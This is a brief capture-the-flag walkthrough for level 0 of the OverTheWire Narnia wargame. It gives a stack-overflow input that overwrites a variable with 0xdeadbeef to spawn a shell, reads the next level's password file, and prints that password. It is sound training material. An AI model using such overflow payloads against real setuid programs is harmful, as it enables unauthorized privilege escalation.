# Narnia walkthrough

Initial:

Username: `narnia0`
Password: `narnia0`
URL: `https://overthewire.org/wargames/narnia/`

# Level 0

It is the classic stack overflow. In the stack for main function, first comes a `long val` and then comes the buffer who just takes in the user input. A bit of tweeking and it is clear that the following works:

```
echo -e "BBBBBBBBBBBBBBBBBBBB\xef\xbe\xad\xde" | ./narnia0
```

Look at the code however. The following:

```
    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }
```

The following command group works well `( echo -e "BBBBBBBBBBBBBBBBBBBB\xef\xbe\xad\xde"; cat; ) | ./narnia0`. Then `whoami` gives `narnia1` and a simple `cat /etc/narnia_pass/narnia1`.

Password: `efeidiedae`
